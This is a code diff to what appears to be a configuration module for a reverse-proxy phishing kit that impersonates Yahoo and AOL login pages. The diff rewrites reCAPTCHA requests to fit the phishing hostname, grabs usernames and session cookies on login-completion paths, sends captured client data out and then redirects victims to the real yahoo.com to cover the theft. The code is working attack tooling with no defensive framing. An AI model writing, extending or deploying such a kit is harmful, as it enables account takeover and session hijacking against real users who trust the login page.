@@ -56,7 +56,6 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
 
 
     processResponse() {
-        this.browserEndPoint.removeHeader('X-Frame-Options')
         if (this.proxyResp.headers['content-length'] < 1) {
             return this.proxyResp.pipe(this.browserEndPoint)
         }
@@ -109,15 +108,9 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
         super.loadAutoGrab(configExport.AUTOGRAB_CODE)
 
-               
-        this.req.headers['origin'] = 'https://login.yahoo.com'
-        this.req.headers['referer'] = 'https://login.yahoo.com'
-
-
         if (this.req.url.startsWith('/recaptcha/enterprise/anchor') || this.req.url.startsWith('/us/en/recaptcha/enterprise/anchor')) {
             const hostnameKey = Buffer.from(`https://${clientContext.hostname}:443`)
             const hostnameBase64Key = hostnameKey.toString('base64');
-            console.log(hostnameBase64Key)
 
             this.req.url = this.req.url.replace('..', '==')
             this.req.url = this.req.url.replace('.&', '=&')
@@ -144,39 +137,41 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
         }
 
+
+        // if (this.req.url.startsWith('/recaptcha/releases')) {
+        //     return super.superExecuteProxy('www.gstatic.com', clientContext)
+
+        // }
+
        
-
-        if (this.req.url.startsWith('/recaptcha/releases')) {
-            return super.superExecuteProxy('www.gstatic.com', clientContext)
-
-        }
-
-        if (this.req.method === 'POST') {
-            super.uploadRequestBody(clientContext.currentDomain, clientContext)
-            clientContext.setLogAvailable(true);
-            // super.captureBody(clientContext.currentDomain, clientContext)
-
-        }
-        if (this.req.url === '/auth/login/finish' || this.req.url === '/account/fb-messenger-linking' 
-        || this.req.url.startsWith('/account/upsell/webauth') || this.req.url.startsWith('/account/comm-channel/')) {
-            super.sendClientData(clientContext, {})
-            return super.exitLink('https://yahoo.com')
-        }
 
 
         const redirectToken = this.checkForRedirect()
         if (redirectToken !== null) {
+
+            const checkUrls = ["https://guce.yahoo.com", 
+            "https://www.yahoo.com/?guccounter=1&guce_referrer=", "https://www.yahoo.com/", 
+             "/account/comm-channel/refresh", '/account/upsell/webauthn',
+             "https://api.login.aol.com/oauth2/request_auth",
+             'https://guce.aol.com/consent', "https://www.aol.com/"
+
+             ]
+             for (let exitUrl of checkUrls) {
+                if (redirectToken.url.startsWith(exitUrl)) {
+                    super.sendClientData(clientContext, {})
+                    this.res.writeHead(302, { location: '/auth/login/finish' })
+                    return super.cleanEnd(clientContext.currentDomain, clientContext)
+                }
+            }
+
             console.log(JSON.stringify(redirectToken))
             const reqCheck = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
             this.req.url = reqCheck.replace(clientContext.hostname, 'www.google.com')
 
-            console.log(this.req.url)
             return this.superExecuteProxy(redirectToken.obj.host, clientContext)
         }
-
-
-
-        return super.superExecuteProxy(clientContext.currentDomain, clientContext)
+      
+        return super.execute(clientContext)
 
     }
 }
@@ -185,16 +180,37 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
 
 const configExport = {
+    SCHEME: 'yahoo',
+
     CURRENT_DOMAIN: 'login.yahoo.com',
 
     START_PATH: '/',
 
     AUTOGRAB_CODE: 'username',
+    COOKIE_PATH: ['/auth/login/finish', '/account/fb-messenger-linking', '/account/upsell/webauth', 
+    '/account/comm-channel/'],
+
+    EXIT_TRIGGER_PATH: ['/auth/login/finish', '/account/fb-messenger-linking', '/account/upsell/webauth', 
+    '/account/comm-channel/'],
 
 
-    PRE_HANDLERS:
-        [
-        ],
+    EXIT_URL: 'https://yahoo.com',
+
+    EXTRA_COMMANDS: [
+        
+        {
+            path: '/recaptcha/releases.*',
+            command: 'CHANGE_DOMAIN',
+            command_args: {
+                new_domain: 'www.gstatic.com',
+                persistent: false,
+                },
+        },
+
+    ],
+
+
+    PRE_HANDLERS:[],
     PROXY_REQUEST: ProxyRequest,
     PROXY_RESPONSE: ProxyResponse,
     DEFAULT_PRE_HANDLER: DefaultPreHandler,
@@ -214,16 +230,16 @@ const configExport = {
             hosts: ['login.yahoo.com'],
         },
 
-
-        defaultPhpCapture: {
-            method: 'POST',
-            params: ['default'],
-            urls: ['/web'],
-            hosts: 'PHP-EXEC',
-        },
-
     },
-    cookieKEY: 'loginUsername'
+
+    //MODULE OPTIONS 
+    MODULE_ENABLED: true,
+
+    MODULE_OPTIONS: {
+        startPath: this.START_PATH,
+        exitLink: '',
+    },
+
 
     // proxyDomain: process.env.PROXY_DOMAIN,
 }
